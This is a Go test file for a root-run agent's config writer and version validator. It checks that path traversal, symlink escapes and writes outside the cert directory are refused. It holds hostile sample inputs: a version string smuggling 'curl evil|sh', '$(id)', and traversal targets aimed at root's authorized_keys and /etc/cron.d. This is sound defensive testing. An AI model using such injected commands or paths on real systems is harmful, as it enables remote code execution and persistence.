// This Source Code Form is subject to the terms of the Mozilla Public
// License, v. 2.0. If a copy of the MPL was not distributed with this
// file, You can obtain one at https://mozilla.org/MPL/2.0/.

package main

import (
	"os"
	"path/filepath"
	"testing"
)

// The agent runs as root and file paths come from the control plane, so
// writeConfigFiles must confine every write to the managed cert dir. A path
// outside it — or one escaping via ".." — must be refused, not written.
func TestWriteConfigFilesConfinesToCertsDir(t *testing.T) {
	base := t.TempDir()

	t.Run("writes a file inside the managed dir", func(t *testing.T) {
		p := filepath.Join(base, "abc123", "crt.pem")
		if err := writeConfigFiles([]ConfigFile{{Path: p, Content: "PEM", Mode: 0o600}}, base); err != nil {
			t.Fatalf("expected success, got %v", err)
		}
		got, err := os.ReadFile(p)
		if err != nil {
			t.Fatalf("read back: %v", err)
		}
		if string(got) != "PEM" {
			t.Fatalf("content = %q, want %q", got, "PEM")
		}
		fi, _ := os.Stat(p)
		if fi.Mode().Perm() != 0o600 {
			t.Fatalf("mode = %v, want 0600", fi.Mode().Perm())
		}
	})

	t.Run("rejects a path escaping via ..", func(t *testing.T) {
		evil := filepath.Join(base, "..", "..", "root", ".ssh", "authorized_keys")
		if err := writeConfigFiles([]ConfigFile{{Path: evil, Content: "x", Mode: 0o600}}, base); err == nil {
			t.Fatalf("expected refusal for %s", evil)
		}
		if _, err := os.Stat(evil); err == nil {
			t.Fatalf("traversal path was written: %s", evil)
		}
	})

	t.Run("rejects an absolute path outside the managed dir", func(t *testing.T) {
		if err := writeConfigFiles([]ConfigFile{{Path: "/etc/cron.d/evil", Content: "x", Mode: 0o644}}, base); err == nil {
			t.Fatal("expected refusal for /etc/cron.d/evil")
		}
	})

	t.Run("rejects a relative path", func(t *testing.T) {
		if err := writeConfigFiles([]ConfigFile{{Path: "relative/crt.pem", Content: "x", Mode: 0o644}}, base); err == nil {
			t.Fatal("expected refusal for a relative path")
		}
	})

	t.Run("rejects a sibling dir sharing the base prefix", func(t *testing.T) {
		// /tmp/base-evil must not pass a prefix check against /tmp/base.
		sibling := base + "-evil/crt.pem"
		if err := writeConfigFiles([]ConfigFile{{Path: sibling, Content: "x", Mode: 0o644}}, base); err == nil {
			t.Fatalf("expected refusal for sibling %s", sibling)
		}
	})
}

// A symlink planted inside the managed cert dir must not redirect a root write
// outside it (lexical prefix check is symlink/TOCTOU-blind).
func TestWriteConfigFilesRejectsSymlinkEscape(t *testing.T) {
	root := t.TempDir()
	base := filepath.Join(root, "certs")
	outside := filepath.Join(root, "outside")
	if err := os.MkdirAll(base, 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(outside, 0o700); err != nil {
		t.Fatal(err)
	}
	// base/evil -> outside : a write to base/evil/x must be refused, not land in outside.
	if err := os.Symlink(outside, filepath.Join(base, "evil")); err != nil {
		t.Fatal(err)
	}
	target := filepath.Join(base, "evil", "x")
	if err := writeConfigFiles([]ConfigFile{{Path: target, Content: "p", Mode: 0o600}}, base); err == nil {
		t.Fatal("expected refusal for a symlinked parent")
	}
	if _, err := os.Stat(filepath.Join(outside, "x")); err == nil {
		t.Fatal("write escaped through the symlink into the outside dir")
	}
}

// A symlink at the exact target path must not be followed (O_NOFOLLOW).
func TestWriteConfigFilesDoesNotFollowFinalSymlink(t *testing.T) {
	root := t.TempDir()
	base := filepath.Join(root, "certs")
	outside := filepath.Join(root, "secret.txt")
	if err := os.MkdirAll(base, 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(outside, []byte("original"), 0o600); err != nil {
		t.Fatal(err)
	}
	link := filepath.Join(base, "crt.pem")
	if err := os.Symlink(outside, link); err != nil {
		t.Fatal(err)
	}
	// Writing to base/crt.pem (a symlink to outside) must not clobber `outside`
	// through the link. Rename replaces the link name, but the tmp open must not
	// have followed a symlink either.
	_ = writeConfigFiles([]ConfigFile{{Path: link, Content: "new", Mode: 0o600}}, base)
	got, _ := os.ReadFile(outside)
	if string(got) != "original" {
		t.Fatalf("wrote through the final symlink: outside = %q", got)
	}
}

func TestIsSemver(t *testing.T) {
	ok := []string{"0.56.0", "v1.2.3", "1.2.3-alpha.1", "1.2.3+build.5", "10.20.30"}
	bad := []string{"", "0.56", "0.56.0; curl evil|sh", "latest", "0.56.0 && x", "$(id)", "../x"}
	for _, v := range ok {
		if !isSemver(v) {
			t.Errorf("expected %q valid", v)
		}
	}
	for _, v := range bad {
		if isSemver(v) {
			t.Errorf("expected %q rejected", v)
		}
	}
}
